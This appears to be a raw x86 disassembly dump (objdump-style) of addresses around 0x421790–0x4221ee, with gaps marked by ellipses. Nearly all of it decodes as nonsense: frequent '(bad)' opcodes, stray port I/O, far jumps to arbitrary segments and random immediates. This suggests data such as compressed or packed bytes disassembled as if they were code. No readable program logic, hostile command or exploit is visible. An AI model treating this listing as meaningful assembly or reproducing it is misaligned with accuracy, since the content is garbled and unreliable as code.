  421790:	sbb    dh,ah
  421792:	sbb    bl,BYTE PTR [esi-0x2e]
  421795:	js     0x4217d2
  421797:	and    al,bh
  421799:	mov    esi,DWORD PTR [esi]
  42179b:	sbb    al,0x77
  42179d:	lock stos DWORD PTR es:[edi],eax
  42179f:	mov    cl,0x56
  4217a1:	mov    ecx,0xd8c77b9
  4217a6:	push   ecx
  4217a7:	test   DWORD PTR ds:0x2f07d1bf,edi
  4217ad:	imul   edi,DWORD PTR [edx-0x26],0x68675362
  4217b4:	add    cl,ch
  4217b6:	(bad)  [edi]
  4217b8:	out    0x98,al
  4217ba:	adc    edi,eax
  4217bc:	or     dl,bh
  4217be:	ret    0x1288
  4217c1:	xchg   esp,eax
  4217c2:	adc    al,0xaf
  4217c4:	adc    ecx,0xffffffac
  4217c7:	je     0x421846
  4217c9:	into   
  4217ca:	ficom  DWORD PTR es:[ebp+esi*8+0xbbe665f]
  4217d2:	inc    edi
  4217d3:	gs stos DWORD PTR es:[edi],eax
  4217d5:	add    ebp,DWORD PTR [edx]
  4217d7:	shl    DWORD PTR [eax],cl
  4217d9:	js     0x4217b7
  4217db:	sbb    ebx,DWORD PTR [ebx-0x48]
  4217de:	pusha  
  4217df:	ins    BYTE PTR es:[edi],dx
  4217e0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4217e2:	leave  
  4217e3:	fdivr  st,st(3)
  4217e5:	int    0xc8
  4217e7:	mov    ebp,0x21fade00
  4217ec:	and    eax,0x89348d77
  4217f1:	in     eax,0x77
  4217f3:	sbb    DWORD PTR [edi],edx
  4217f5:	jns    0x421863
  4217f7:	clc    
  4217f8:	fdivr  st,st(6)
  4217fa:	push   cs
  4217fb:	das    
  4217fc:	es sub eax,0xd5b80a0
  421802:	loop   0x4217d4
  421804:	jp     0x421851
  421806:	aaa    
  421807:	mov    ds:0xe6ee5497,eax
  42180c:	inc    edi
  42180d:	xchg   esi,eax
  42180e:	repz mov ebp,0x46c6ba53
  421814:	mov    esi,0x29133df0
  421819:	pop    ebx
  42181a:	dec    BYTE PTR ss:[esi]
  42181d:	xor    DWORD PTR [edx+0x5f],0xb50c491d
  421824:	push   eax
  421825:	lods   eax,DWORD PTR ds:[esi]
  421826:	fstp   TBYTE PTR [ecx]
  421828:	outs   dx,DWORD PTR ds:[esi]
  421829:	repnz std 
  42182b:	das    
  42182c:	das    
  42182d:	sahf   
  42182e:	repnz pushf 
  421830:	sbb    BYTE PTR [edi-0x28],0x2d
  421834:	arpl   ax,bp
  421836:	xlat   BYTE PTR ds:[bx]
  421838:	mov    ah,0x88
  42183a:	test   al,0x68
  42183c:	jmp    0x421888
  42183e:	maxps  xmm7,XMMWORD PTR [edx+0x3c586e08]
  421845:	das    
  421846:	sahf   
  421847:	pusha  
  421848:	xor    DWORD PTR [edi-0x19],eax
  42184b:	push   ss
  42184c:	mov    ds:0xe7ef8bea,al
  421851:	cld    
  421852:	inc    edx
  421853:	push   0xce5f385
  421858:	es cmc 
  42185a:	popf   
  42185b:	push   ds
  42185c:	ja     0x4218a4
  42185e:	mov    WORD PTR [esi-0x1e96bdc7],cs
  421864:	inc    edi
  421865:	pop    ss
  421866:	mov    edx,0xc4f33bd6
  42186b:	iret   
  42186c:	loop   0x42189f
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	pop    es
  4218e3:	dec    esi
  4218e4:	adc    al,0x99
  4218e6:	addr16 push 0x1000001
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	xlat   BYTE PTR ds:[ebx]
  4218ef:	and    al,0xae
  4218f1:	adc    eax,DWORD PTR [edi-0x76d2952d]
  4218f7:	pop    ss
  4218f8:	dec    esp
  4218f9:	(bad)  
  4218fb:	pop    es
  4218fc:	inc    esi
  4218fd:	pop    esp
  4218fe:	mov    ah,0xf8
  421900:	sub    ebx,DWORD PTR [esi+0x6c]
  421903:	pop    esi
  421904:	mov    al,BYTE PTR [ebx-0x50]
  421907:	repnz xor BYTE PTR [edi+0x3f76472f],bh
  42190e:	outs   dx,DWORD PTR ds:[esi]
  42190f:	call   0x9020:0xe4073d44
  421916:	cmc    
  421917:	ret    
  421918:	mov    ?,WORD PTR ds:0xd17f9fa2
  42191e:	pop    eax
  42191f:	test   eax,0xa61f1da5
  421924:	jg     0x42196a
  421926:	ret    0x66b2
  421929:	shl    BYTE PTR [edx-0x23ee7a95],1
  42192f:	cmp    al,al
  421931:	frstor [edi-0x11682605]
  421937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421938:	fdivr  QWORD PTR [ebp-0x43887185]
  42193e:	fld    QWORD PTR [ecx]
  421940:	sub    bl,BYTE PTR [edx]
  421942:	retf   0xb56
  421945:	sbb    al,0x8b
  421947:	fst    DWORD PTR [edi]
  421949:	mov    bl,ah
  42194b:	dec    eax
  42194c:	add    al,0x82
  42194e:	dec    edx
  42194f:	fadd   DWORD PTR [edx-0x1b1af8ec]
  421955:	(bad)  
  421956:	push   ecx
  421957:	push   ds
  421958:	into   
  421959:	mov    dh,0xfb
  42195b:	rol    DWORD PTR [eax],1
  42195d:	cli    
  42195e:	cld    
  42195f:	xchg   ecx,eax
  421960:	int    0x78
  421962:	add    DWORD PTR [edx],ebp
  421964:	adc    eax,0xe95634
  421969:	scas   eax,DWORD PTR es:[edi]
  42196a:	add    esp,DWORD PTR [ebp-0x1859744e]
  421970:	push   ecx
  421971:	hlt    
  421972:	xlat   BYTE PTR ds:[ebx]
  421973:	popa   
  421974:	stos   BYTE PTR es:[edi],al
  421975:	push   ebp
  421976:	push   ss
  421977:	cmp    ch,al
  421979:	std    
  42197a:	mov    esp,DWORD PTR [ebx-0x1eca4274]
  421980:	adc    esi,DWORD PTR [eax-0x16]
  421983:	out    0xc3,al
  421985:	lods   eax,DWORD PTR ds:[esi]
  421986:	cmp    DWORD PTR [edi-0x67],eax
  421989:	mov    ch,0xfb
  42198b:	js     0x4219f9
  42198d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42198e:	xor    DWORD PTR [ecx],esp
  421990:	and    dh,BYTE PTR [edx-0x73]
  421993:	in     eax,dx
  421994:	cmp    al,0x90
  421996:	jp     0x42192d
  421998:	xchg   DWORD PTR [edi+0x6],ebp
  42199b:	pop    ebp
  42199c:	mov    edi,DWORD PTR [edx+ebx*4+0x4e]
  4219a0:	xor    BYTE PTR [esi-0x6e43b0a2],bl
  4219a6:	ret    
  4219a7:	sbb    bl,ch
  4219a9:	jns    0x421961
  4219ab:	mov    ebx,0x4fb7afe7
  4219b0:	bound  ecx,QWORD PTR [edi-0x685beb65]
  4219b6:	aas    
  4219b7:	xchg   ebx,eax
  4219b8:	cmp    eax,0x483f3c5a
  4219bd:	push   ds
  4219be:	retf   
  4219bf:	xor    al,0xe6
  4219c1:	imul   esi,DWORD PTR [ebx-0x2b],0xf0cdc4a2
  4219c8:	mov    ebp,0x5377e73b
  4219cd:	or     al,0xff
  4219cf:	ja     0x4219ba
  4219d1:	dec    ebp
  4219d2:	cmp    DWORD PTR [edi+0x3f],esi
  4219d5:	loopne 0x4219d5
  4219d7:	fstp   TBYTE PTR [ebp+eiz*4+0x297341bd]
  4219de:	jmp    0x15e8:0x47b3704b
  4219e5:	xor    DWORD PTR [ebx],ecx
  4219e7:	aaa    
  4219e8:	outs   dx,DWORD PTR ds:[esi]
  4219e9:	fs and al,0x3e
  4219ec:	ins    BYTE PTR es:[edi],dx
  4219ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	mov    BYTE PTR [ecx],bl
  421a64:	stc    
  421a65:	(bad)  
  421a66:	imul   eax,DWORD PTR [bx+di],0x10000
  421a6d:	add    BYTE PTR [ecx+0x7866ae8e],dh
  421a73:	cmp    al,0x5
  421a75:	xchg   edi,eax
  421a76:	pop    esi
  421a77:	fld    DWORD PTR [edi+eax*4]
  421a7a:	(bad)  
  421a7b:	mov    esi,0xfb0e000f
  421a80:	jbe    0x421aad
  421a82:	scas   al,BYTE PTR es:[edi]
  421a83:	dec    eax
  421a84:	pop    ss
  421a85:	cmp    DWORD PTR [edx],ecx
  421a87:	sub    eax,0xecc0043a
  421a8c:	jmp    0xaf93e23c
  421a91:	lea    edi,[eax+edi*4+0x3f]
  421a95:	xor    bh,BYTE PTR [ecx]
  421a97:	xchg   BYTE PTR [eax+0x2d],cl
  421a9a:	dec    esp
  421a9b:	mov    ds:0x155c76d5,al
  421aa0:	xor    DWORD PTR [ecx],esi
  421aa2:	(bad)  
  421aa3:	data16 jp 0x421a8a
  421aa6:	push   edx
  421aa7:	popa   
  421aa8:	jle    0x421a4b
  421aaa:	sbb    ch,ah
  421aac:	and    al,0x41
  421aae:	ins    DWORD PTR es:[edi],dx
  421aaf:	xchg   esi,eax
  421ab0:	jecxz  0x421a5f
  421ab2:	ror    DWORD PTR [edi],cl
  421ab4:	ror    BYTE PTR [edx+edi*4-0x68],0x5
  421ab9:	cld    
  421aba:	sbb    edx,0x65
  421abd:	pop    ss
  421abe:	cdq    
  421abf:	cmp    BYTE PTR [ecx],dl
  421ac1:	mov    al,ds:0x23612e17
  421ac6:	mov    al,0xed
  421ac8:	lahf   
  421ac9:	jne    0x421ab1
  421acb:	call   FWORD PTR [ebp-0x35545cb9]
  421ad1:	(bad)  
  421ad2:	sub    al,0x43
  421ad4:	lods   eax,DWORD PTR ds:[esi]
  421ad5:	adc    edi,edx
  421ad7:	hlt    
  421ad8:	fs ins DWORD PTR es:[edi],dx
  421ada:	cmp    esi,DWORD PTR [edx-0x11]
  421add:	jmp    FWORD PTR [edi-0x6cd80095]
  421ae3:	mov    al,0x7b
  421ae5:	mov    dl,0x47
  421ae7:	ror    BYTE PTR [esi+0x3e340574],1
  421aed:	and    cl,bl
  421aef:	dec    edx
  421af0:	pop    ds
  421af1:	mov    gs,WORD PTR [edx+0x69a61ac2]
  421af7:	int3   
  421af8:	xlat   BYTE PTR ds:[ebx]
  421af9:	and    DWORD PTR [esi-0x29d30282],0x30
  421b00:	loop   0x421b2b
  421b02:	mov    esp,0x2ff5a8b6
  421b07:	add    DWORD PTR [edi+0x17],ecx
  421b0a:	mov    edx,0x18f5e463
  421b0f:	mov    cl,0xf2
  421b11:	jnp    0x421b83
  421b13:	and    BYTE PTR [ebp-0x4c03ebb6],ah
  421b19:	mov    ds:0x231b58ac,al
  421b1e:	cmp    cl,BYTE PTR [eax+edi*1-0x6]
  421b22:	mov    ebx,0x679f99b8
  421b27:	dec    esi
  421b28:	or     ah,BYTE PTR [edi+0x3d3fc389]
  421b2e:	lods   eax,DWORD PTR ds:[esi]
  421b2f:	icebp  
  421b30:	sbb    al,0xab
  421b32:	outs   dx,DWORD PTR ds:[esi]
  421b33:	not    BYTE PTR [esi]
  421b35:	push   0x19
  421b37:	or     eax,0x3c4f65e
  421b3c:	call   0x2cd8:0x8647c836
  421b43:	out    0x97,al
  421b45:	mov    bh,BYTE PTR [edi+esi*8]
  421b48:	cmp    bh,BYTE PTR [eax-0x47]
  421b4b:	test   al,0x47
  421b4d:	adc    cl,ah
  421b4f:	sub    eax,0x8027a415
  421b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b55:	imul   esp,ebp,0x4e
  421b58:	jmp    0xe332:0x8048489
  421b5f:	repz fwait
  421b61:	xchg   DWORD PTR [ebx],ebp
  421b63:	cmp    eax,0x5dfd0ae9
  421b68:	inc    ebx
  421b69:	adc    al,0xba
  421b6b:	loop   0x421ba6
  421b6d:	pop    ecx
	...
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     ah,BYTE PTR [edi+0x671cc932]
  421be7:	push   0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [ecx],al
  421bef:	inc    ebx
  421bf0:	shl    BYTE PTR [ebx+0x40dfc793],0x7
  421bf7:	faddp  st(7),st
  421bf9:	ret    
  421bfa:	mov    ?,edi
  421bfc:	mov    ch,0x3c
  421bfe:	addps  xmm3,XMMWORD PTR [edx]
  421c01:	and    eax,0x785eb3e1
  421c06:	in     al,0x26
  421c08:	jmp    0xca4a872b
  421c0d:	jecxz  0x421c8d
  421c0f:	and    BYTE PTR [ecx+0x30],ah
  421c12:	cmp    esi,esi
  421c14:	jo     0x421c40
  421c16:	add    BYTE PTR [edx],ch
  421c18:	xchg   ebx,eax
  421c19:	call   0xc4f6:0x1b9372d2
  421c20:	ret    
  421c21:	xor    ebx,DWORD PTR [ebp+0x60]
  421c24:	mov    al,ds:0xe04efa05
  421c29:	add    eax,0x60f4b99
  421c2e:	mov    ecx,0xc41a50ab
  421c33:	repz jmp 0x9922:0x31819b20
  421c3b:	jmp    0x1e92:0xb59a18be
  421c42:	or     al,0xa7
  421c44:	stos   BYTE PTR es:[edi],al
  421c45:	cmp    eax,0xc7dd74d1
  421c4a:	cwde   
  421c4b:	xor    DWORD PTR [ebp+0x33],ecx
  421c4e:	or     ebx,ebx
  421c50:	and    BYTE PTR [esi+0xa1a3dc2],cl
  421c56:	stc    
  421c57:	adc    esi,DWORD PTR [edi]
  421c59:	int3   
  421c5a:	mov    ds,WORD PTR [ebp+0x42684065]
  421c60:	add    DWORD PTR cs:[eax-0x3b4120f6],ecx
  421c67:	nop
  421c68:	sub    bh,BYTE PTR [esi-0x4347ada6]
  421c6e:	mov    cl,0x44
  421c70:	cmp    eax,0x9d828ea0
  421c75:	in     eax,0x29
  421c77:	xchg   BYTE PTR [eax],dh
  421c79:	sbb    eax,0x77ada512
  421c7e:	jl     0x421ccb
  421c80:	pop    esi
  421c81:	mov    ebx,ebp
  421c83:	lods   eax,DWORD PTR ds:[esi]
  421c84:	xor    esp,esi
  421c86:	retf   
  421c87:	fsubp  st(2),st
  421c89:	or     eax,0x674028ce
  421c8e:	and    eax,0x3efe4951
  421c93:	stos   DWORD PTR es:[edi],eax
  421c94:	push   edx
  421c95:	dec    ebx
  421c96:	lds    edx,FWORD PTR [ecx+0x1c12ff4c]
  421c9c:	rol    bh,1
  421c9e:	in     al,0x2a
  421ca0:	mov    bl,0x4c
  421ca2:	or     al,BYTE PTR [eax]
  421ca4:	push   es
  421ca5:	imul   ebx,DWORD PTR [eax+0x26],0x69c3bb63
  421cac:	adc    BYTE PTR [edi-0x128647e8],0x2d
  421cb3:	repnz arpl WORD PTR [edx],si
  421cb6:	mov    fs,ebp
  421cb8:	mov    ch,0x61
  421cba:	stos   BYTE PTR es:[edi],al
  421cbb:	cmp    ebp,DWORD PTR [ebx+0x7b]
  421cbe:	and    ecx,DWORD PTR [eax-0x55d61ae5]
  421cc4:	jmp    FWORD PTR [edx-0x7bc2943]
  421cca:	push   edi
  421ccb:	call   0x205e4373
  421cd0:	pop    ebx
  421cd1:	xor    DWORD PTR [edi+0x72],ebx
  421cd4:	les    ebx,FWORD PTR [esi+0x6d2c3ae4]
  421cda:	sub    eax,DWORD PTR [ebx-0x20]
  421cdd:	inc    ecx
  421cde:	and    BYTE PTR [ecx+0x5e479e42],bh
  421ce4:	unpcklps xmm1,xmm1
  421ce7:	scas   eax,DWORD PTR es:[edi]
  421ce8:	mov    esp,0xc6be45ce
  421ced:	fild   DWORD PTR [eax]
	...
  421d53:	add    BYTE PTR [eax],al
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	inc    eax
  421d63:	inc    ecx
  421d64:	push   ss
  421d65:	pop    ebp
  421d66:	imul   eax,DWORD PTR [bx+di],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d6f:	ja     0x421d2c
  421d71:	inc    edi
  421d72:	add    bh,BYTE PTR [ebp-0x154c1aa]
  421d78:	clc    
  421d79:	add    ebx,DWORD PTR ds:0x41c1848
  421d7f:	fucomi st,st(4)
  421d81:	sub    BYTE PTR [esi+ecx*4-0x78],dh
  421d85:	out    dx,al
  421d86:	das    
  421d87:	mov    ah,BYTE PTR [edx-0x1471423d]
  421d8d:	pop    ds
  421d8e:	mov    ah,0x1e
  421d90:	adc    al,0x92
  421d92:	pop    eax
  421d93:	cli    
  421d94:	jmp    0x3fe9:0x14f18fa0
  421d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d9c:	sbb    al,0x32
  421d9e:	jl     0x421de9
  421da0:	and    BYTE PTR [edx-0x53],dl
  421da3:	adc    DWORD PTR [ebp+0x6e],0x1c
  421da7:	sbb    ebp,eax
  421da9:	sub    ebx,DWORD PTR [esi-0x214e1f7]
  421daf:	adc    DWORD PTR [edx+edi*1],esi
  421db2:	sti    
  421db3:	pop    ebp
  421db4:	test   DWORD PTR ds:0x47e3ef6e,eax
  421dba:	mov    al,0x33
  421dbc:	pop    ecx
  421dbd:	jbe    0x421e3a
  421dbf:	xlat   BYTE PTR ds:[ebx]
  421dc0:	xchg   esi,eax
  421dc1:	pushf  
  421dc2:	push   cs
  421dc3:	inc    edi
  421dc4:	mov    al,0x4f
  421dc6:	nop
  421dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dc8:	ins    DWORD PTR es:[edi],dx
  421dc9:	sub    al,0x4c
  421dcb:	ror    BYTE PTR [ebx+eax*8-0x63],1
  421dcf:	cmp    BYTE PTR [edi+0x1003644a],bl
  421dd5:	stos   DWORD PTR es:[edi],eax
  421dd6:	adc    al,0xd4
  421dd8:	xor    DWORD PTR [edx],ebx
  421dda:	cli    
  421ddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ddc:	push   cs
  421ddd:	fidivr DWORD PTR [esp+0x54]
  421de1:	and    dh,BYTE PTR [esi]
  421de3:	pop    ebp
  421de4:	cs and al,0x52
  421de7:	dec    ebp
  421de8:	shl    BYTE PTR [eax-0x2d0a9a89],0x27
  421def:	loope  0x421e2e
  421df1:	dec    edx
  421df2:	adc    al,0xe1
  421df4:	rol    DWORD PTR [ecx+0x14],0xb
  421df8:	loopne 0x421de5
  421dfa:	fsub   QWORD PTR [edi]
  421dfc:	inc    esp
  421dfd:	arpl   WORD PTR ds:0x81bc8ff3,dx
  421e03:	stos   DWORD PTR es:[edi],eax
  421e04:	xor    al,0x67
  421e06:	inc    ecx
  421e07:	jl     0x421e4c
  421e09:	dec    ecx
  421e0a:	repz call 0x720e:0x479bbd79
  421e12:	add    ecx,DWORD PTR [edi-0x13c28a5b]
  421e18:	daa    
  421e19:	pop    eax
  421e1a:	test   eax,0x55a857e0
  421e1f:	lods   eax,DWORD PTR ds:[esi]
  421e20:	dec    eax
  421e21:	add    al,0x95
  421e23:	paddb  mm7,QWORD PTR [ebp-0x11]
  421e27:	sbb    al,0x8e
  421e29:	pop    es
  421e2a:	xor    eax,0x512dafbc
  421e2f:	cmp    al,0x38
  421e31:	std    
  421e32:	push   es
  421e33:	mov    ch,0x74
  421e35:	push   es
  421e36:	xor    BYTE PTR [ebx-0x316cc3be],bl
  421e3c:	test   al,0xd2
  421e3e:	(bad)  
  421e3f:	in     al,dx
  421e40:	mov    ch,0x21
  421e42:	jbe    0x421dcc
  421e44:	mov    edx,0xc63cb451
  421e49:	test   al,0x75
  421e4b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  421e4d:	xlat   BYTE PTR ds:[ebx]
  421e4e:	ret    0x95d0
  421e51:	lds    edi,FWORD PTR [ecx]
  421e53:	cmp    al,0x9c
  421e55:	ficom  DWORD PTR ds:0x9e7bb6d3
  421e5b:	jne    0x421e2c
  421e5d:	loope  0x421e7d
  421e5f:	push   ds
  421e60:	xor    al,0xb7
  421e62:	inc    esi
  421e63:	or     BYTE PTR [edi],bh
  421e65:	mov    DWORD PTR [ebp-0x76],edi
  421e68:	inc    ebp
  421e69:	mov    edi,edx
  421e6b:	adc    BYTE PTR [edi+ecx*2],al
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	scas   eax,DWORD PTR es:[edi]
  421ee3:	xchg   esi,eax
  421ee4:	das    
  421ee5:	mov    al,ds:0x16c67
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	push   eax
  421eef:	iret   
  421ef0:	repz add eax,ecx
  421ef3:	jne    0x421f27
  421ef5:	pop    ecx
  421ef6:	je     0x421ed8
  421ef8:	sub    al,0xae
  421efa:	cmp    edi,DWORD PTR [eax+0x28]
  421efd:	mov    al,ds:0x41148233
  421f02:	push   ss
  421f03:	data16 and al,0x6e
  421f06:	std    
  421f07:	pop    ebp
  421f08:	add    eax,0x67dc02fe
  421f0d:	cli    
  421f0e:	outs   dx,BYTE PTR es:[esi]
  421f10:	and    DWORD PTR [edi-0x7ecdfab7],0xffffffd1
  421f17:	loop   0x421ee1
  421f19:	push   ebp
  421f1a:	jnp    0x421ecd
  421f1c:	jae    0x421eb4
  421f1e:	fbld   TBYTE PTR [ebp+0x6ccbfc9f]
  421f24:	add    esp,DWORD PTR [edx-0x35896627]
  421f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f2b:	sbb    dh,BYTE PTR [edx]
  421f2d:	inc    edx
  421f2e:	push   es
  421f2f:	loop   0x421f05
  421f31:	scas   al,BYTE PTR es:[edi]
  421f32:	cli    
  421f33:	mov    eax,ds:0x1512b65f
  421f38:	sub    DWORD PTR [esi+0x1e9a2e5b],ebp
  421f3e:	imul   ecx,DWORD PTR [edi],0xffffffe9
  421f41:	mov    dl,0x5e
  421f43:	aam    0x17
  421f45:	mov    al,ds:0xe57b73a5
  421f4a:	js     0x421f04
  421f4c:	mov    ecx,0x1a9b77b6
  421f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f52:	or     BYTE PTR [eax-0x6f94e6a2],dh
  421f58:	inc    ecx
  421f59:	mov    dl,0x39
  421f5b:	pop    esp
  421f5c:	nop
  421f5d:	mov    ds:0xe78bac75,al
  421f62:	stc    
  421f63:	push   esp
  421f64:	mov    cl,0xb0
  421f66:	pop    edi
  421f67:	sar    DWORD PTR ds:0x37f70d01,1
  421f6d:	mov    bh,0x0
  421f6f:	nop
  421f70:	ins    DWORD PTR es:[edi],dx
  421f71:	in     eax,0x8b
  421f73:	push   ebx
  421f74:	sub    DWORD PTR ds:0x57103884,esp
  421f7a:	into   
  421f7b:	jge    0x421fdd
  421f7d:	push   ecx
  421f7e:	mov    ch,0xa9
  421f80:	mov    dh,0xfe
  421f82:	ss mov edx,0x73a02a35
  421f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f89:	fld    TBYTE PTR [eax-0x29ad7b16]
  421f8f:	jmp    0x1298:0x5b653b83
  421f96:	repnz in eax,0x8
  421f99:	push   0x22
  421f9b:	xor    al,0x2
  421f9d:	sahf   
  421f9e:	inc    esi
  421f9f:	adc    DWORD PTR [ecx],ebx
  421fa1:	fisttp DWORD PTR [edi+0x2e]
  421fa4:	pop    edx
  421fa5:	jae    0x422021
  421fa7:	xor    eax,0x92dc974d
  421fac:	add    BYTE PTR [edi-0x30],cl
  421faf:	in     eax,dx
  421fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb1:	pop    ds
  421fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb3:	clc    
  421fb4:	cmp    eax,0x7e174100
  421fb9:	push   edi
  421fba:	and    bl,BYTE PTR [edi-0x69]
  421fbd:	inc    ebp
  421fbe:	cmp    BYTE PTR ds:0x4b619b,cl
  421fc4:	and    ch,bl
  421fc6:	fimul  DWORD PTR [eax+0x53]
  421fc9:	cmp    edi,edi
  421fcb:	adc    al,0x16
  421fcd:	xchg   ebx,eax
  421fce:	pop    esi
  421fcf:	xlat   BYTE PTR ds:[ebx]
  421fd0:	mov    bh,0x6b
  421fd2:	mov    cl,BYTE PTR [ebp+0x24]
  421fd5:	mov    bl,0xf0
  421fd7:	cwde   
  421fd8:	dec    eax
  421fd9:	pop    es
  421fda:	jmp    0x421f92
  421fdc:	pop    esp
  421fdd:	fwait
  421fde:	mov    cl,0xe
  421fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fe1:	sbb    ebx,edx
  421fe3:	push   ecx
  421fe4:	cmp    al,0x30
  421fe6:	(bad)  
  421fe8:	sar    DWORD PTR [eax-0x1e],0x96
  421fec:	sbb    eax,0x3f
	...
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 test BYTE PTR [ebx+0x6d672f52],al
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	gs ds in eax,dx
  422071:	add    eax,0x225cc021
  422076:	sub    al,0x75
  422078:	mov    BYTE PTR [ecx+0x75],dh
  42207b:	icebp  
  42207c:	fnstsw WORD PTR [eax+0x13]
  42207f:	das    
  422080:	adc    al,0x89
  422082:	jne    0x42200a
  422084:	and    BYTE PTR [edi-0x64],dh
  422087:	jmp    0x8ae7:0xb2d43f6c
  42208e:	dec    esi
  42208f:	mov    al,0xfa
  422091:	sbb    eax,0xfddd23c0
  422096:	and    bl,BYTE PTR [ecx]
  422098:	cli    
  422099:	rcl    ebp,0xda
  42209c:	fldcw  WORD PTR [ebx+0x279af839]
  4220a2:	or     bh,BYTE PTR [edi-0x36]
  4220a5:	jl     0x42206a
  4220a7:	push   es
  4220a8:	outs   dx,DWORD PTR ds:[esi]
  4220a9:	sar    DWORD PTR [esi+ebx*8-0x2a6f44a5],cl
  4220b0:	push   esi
  4220b1:	pop    ebx
  4220b2:	adc    DWORD PTR [edx],edx
  4220b4:	sbb    DWORD PTR [ebx+0x6cecc02c],0x2c
  4220bb:	les    ebx,FWORD PTR [edx]
  4220bd:	stos   BYTE PTR es:[edi],al
  4220be:	adc    DWORD PTR [esi+0x53],edi
  4220c1:	enter  0xcc8c,0xfc
  4220c5:	sbb    cl,al
  4220c7:	inc    ecx
  4220c8:	xlat   BYTE PTR ds:[ebx]
  4220c9:	jo     0x422145
  4220cb:	repz push ds
  4220cd:	or     al,0x8b
  4220cf:	ja     0x4220e7
  4220d1:	repz out dx,al
  4220d3:	nop
  4220d4:	sub    al,0xa6
  4220d6:	idiv   DWORD PTR [esi+0x6e28eb27]
  4220dc:	ins    BYTE PTR es:[edi],dx
  4220dd:	rol    DWORD PTR [esi-0x46],cl
  4220e0:	mov    dh,0x3c
  4220e2:	push   ecx
  4220e3:	imul   ebp,DWORD PTR ds:0x5935b38c,0x2b758d30
  4220ed:	mov    eax,0xce9ccb06
  4220f2:	rep outs dx,DWORD PTR ds:[esi]
  4220f4:	jecxz  0x4220b9
  4220f6:	aad    0x45
  4220f8:	add    al,0xf9
  4220fa:	adc    al,0x1c
  4220fc:	lds    edi,FWORD PTR [edx-0x661e989f]
  422102:	jmp    0x39e6:0xd1f2e005
  422109:	adc    BYTE PTR [ecx+0x7976bf48],cl
  42210f:	adc    BYTE PTR [ebx],bh
  422111:	retf   0x4833
  422114:	in     eax,0x68
  422116:	jge    0x422148
  422118:	in     eax,0xfd
  42211a:	repz fld TBYTE PTR [eax]
  42211d:	data16 repz ss (bad) 
  422121:	pushf  
  422122:	aam    0x50
  422124:	jecxz  0x422123
  422126:	daa    
  422127:	hlt    
  422128:	and    al,0xb4
  42212a:	popf   
  42212b:	pop    ebx
  42212c:	fst    QWORD PTR [edx+ecx*2]
  42212f:	ds int3 
  422131:	mov    DWORD PTR [ebp-0x28],ecx
  422134:	add    bh,BYTE PTR [ebp+0x39]
  422137:	in     eax,0x7
  422139:	clc    
  42213a:	adc    al,0x5b
  42213c:	dec    esi
  42213d:	stos   BYTE PTR es:[edi],al
  42213e:	adc    BYTE PTR fs:[ecx+0x241ab308],cl
  422145:	or     DWORD PTR ds:0x55cfd364,eax
  42214b:	xor    DWORD PTR [ecx],0x318972a3
  422151:	fsub   DWORD PTR [ecx+edi*4+0x5f840765]
  422158:	in     eax,dx
  422159:	jo     0x4220ef
  42215b:	leave  
  42215c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215d:	ja     0x42219b
  42215f:	mov    DWORD PTR [edi+0x7c578543],eax
  422165:	ffree  st(6)
  422167:	fmulp  st(2),st
  422169:	fcomp  QWORD PTR cs:[eax]
  42216c:	(bad)  
  42216d:	mov    esp,0x0
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ecx,DWORD PTR [esi]
  4221e3:	jmp    0x1:0x6e679e2b
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	inc    edx
